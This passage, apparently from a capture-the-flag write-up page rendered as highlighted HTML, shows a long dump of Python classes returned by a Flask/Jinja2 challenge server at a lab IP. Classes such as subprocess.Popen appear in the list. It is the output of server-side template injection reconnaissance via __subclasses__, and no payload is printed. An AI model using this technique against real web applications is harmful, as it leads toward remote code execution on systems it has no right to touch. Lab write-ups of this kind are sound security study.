class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;deque_iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.imap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.ifilter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.ifilterfalse&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.izip&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.izip_longest&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.tee_dataobject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.tee&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;thread._local&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;thread.lock&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;Struct&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;time.struct_time&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;threading._Verbose&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cPickle.Unpickler&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cPickle.Pickler&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cStringIO.StringO&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cStringIO.StringI&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;string.Template&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;string.Formatter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._closedsocket&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._socketobject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._fileobject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;urlparse.ResultMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;contextlib.GeneratorContextManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;contextlib.closing&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;markupsafe._MarkupEscapeHelper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.nodes.EvalContext&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_hashlib.HASH&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.nodes.Node&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_random.Random&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.Environment&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.LoopContextBase&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.LoopContextIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Macro&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;numbers.Number&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._ContextManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._WorkRep&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._Log10Memoize&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ast.AST&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.visitor.NodeVisitor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.idtracking.Symbols&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.compiler.MacroRef&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.loaders.BaseLoader&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Formatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug._internal._DictAccessorProperty&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ViewItems&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures._omd_bucket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.Headers&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.IfRange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.Range&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ContentRange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.FileStorage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;email.LazyImporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.urls.Href&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.utils.HTMLBuilder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi.FileWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi._RangeWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.formparser.FormDataParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.formparser.MultiPartParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.exceptions.Aborter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;CArgObject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.CThunkObject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes._CData&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.CField&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.DictRemover&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ctypes.CDLL&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ctypes.LibraryLoader&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.serializer.Serializer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask._compat._DeprecatedBool&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.Local&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalStack&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalProxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.RuleFactory&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.RuleTemplate&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.BaseConverter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.Map&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.MapAdapter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.types.ParamType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.Option&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.Argument&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.ParsingState&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.OptionParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.formatting.HelpFormatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.BaseCommand&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.signals.Namespace&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.signals._FakeSignal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.helpers.locked_cached_property&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.helpers._PackageBoundObject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.cli.DispatchingApp&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.cli.ScriptInfo&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.config.ConfigAttribute&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx._AppCtxGlobals&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx.AppContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx.RequestContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.sessions.SessionInterface&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.json._JSONModule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.blueprints.BlueprintSetupState&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.ext.Extension&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving._SSLContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving.BaseWSGIServer&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;method-wrapper&#x27;</span>&gt;] <span class="hljs-keyword">not</span> found<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">URL http://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">50859</span>/[&lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span 